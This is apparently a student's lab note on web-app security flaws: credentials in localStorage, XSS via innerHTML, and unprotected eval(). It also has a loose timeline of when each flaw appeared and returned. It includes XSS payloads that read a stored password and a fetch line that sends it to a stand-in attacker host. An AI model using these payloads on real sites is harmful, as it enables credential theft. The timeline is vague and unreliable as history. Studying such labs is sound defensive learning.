# study_labs

# First lab
1.	Inappropriate creds storage via localstorage
2.	XSS via innerHTML unsanitized injection
3.	Unprotected eval()


Explotation:
1.	<img src=x onerror="alert(localStorage.getItem('password'))" '>
2.	<img src=x onerror=alert(1) '>
3.	alert("blabla")


Any of exploits can be extracted to remote “attacker” host via concatenation of expression evaluation to malicious address:
fetch('https://attacker.com/steal?p=' + localStorage.getItem('password'));


1.	Appeared in late 1990s
Then was mitigated in mid 2000s to 2010s
And returned in 2020s up to current year – thankfully to AI
2.	Appeared in early 2010s
Then been globally mitigated in 2010s
And returned again in same 2020s up to current year by same problem
3.	Appeared in 2000s
Was mitigated in 2000s – 2010s
And again returned in last several years
